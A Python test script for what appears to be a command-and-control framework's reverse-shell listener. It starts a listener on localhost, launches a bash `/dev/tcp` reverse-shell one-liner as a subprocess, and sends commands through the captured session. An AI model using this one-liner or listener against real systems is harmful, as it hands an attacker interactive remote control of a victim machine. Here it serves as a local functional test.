#!/usr/bin/env python3
"""Test the reverse-shell (raw TCP interactive shell) listener end-to-end.

Starts a ReverseShellListener on a local port, then opens a real bash reverse
shell (`bash -i >& /dev/tcp/HOST/PORT 0>&1`) as a subprocess, and drives it
through the server session: send `echo`/`pwd` and confirm the output comes
back.
"""
import os, sys, time, shutil, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cs.server import TeamServer, ReverseShellListener
from cs.server.reverseshell import reverse_shell_command

PORT = 21999
srv = TeamServer(data_dir=os.path.join(os.path.dirname(os.path.abspath(__file__)), "data_rsh"))
shutil.rmtree(srv.data_dir, ignore_errors=True)

# start reverse-shell listener (hold server in background thread)
srv.start_reverse_shell("rsh", "127.0.0.1", PORT, on_session=lambda s: print("  [~] rsh session:", s.id, flush=True))

# build the callback one-liner
cmd = reverse_shell_command("127.0.0.1", PORT, "bash")
print("[+] callback command:", cmd)
assert "bash -i >& /dev/tcp/127.0.0.1/%d" % PORT in cmd

# execute the reverse shell as a real target subprocess
proc = subprocess.Popen(["/bin/bash", "-c", cmd],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# wait for the session to register
dl = time.time() + 8
sess = None
while time.time() < dl:
    sessions = srv.rsh_listeners["rsh"].list_sessions()
    if sessions:
        sess = sessions[0]
        break
    time.sleep(0.3)
if sess is None:
    print("[!] no reverse-shell session appeared")
    proc.terminate(); sys.exit(1)
print("[+] session:", sess.id, "peer", sess.addr)

# flush any banner, then send commands
time.sleep(0.5)
sess.read_available()

def run_cmd(command, wait=0.5):
    sess.send_line(command)
    time.sleep(wait)
    return sess.read_available().decode(errors="replace")

out1 = run_cmd("echo REVShellOK")
out2 = run_cmd("pwd")
print("--- echo output ---", repr(out1))
print("--- pwd output ---", repr(out2))

ok = "REVShellOK" in out1 and os.getcwd().split("/")[-1] in out2
# cleanup: type exit
try: sess.send_line("exit")
except Exception: pass
proc.terminate()
srv.stop_reverse_shell("rsh")
print("\n[PASS]" if ok else "[FAIL]", "reverse-shell interactive control")
sys.exit(0 if ok else 1)
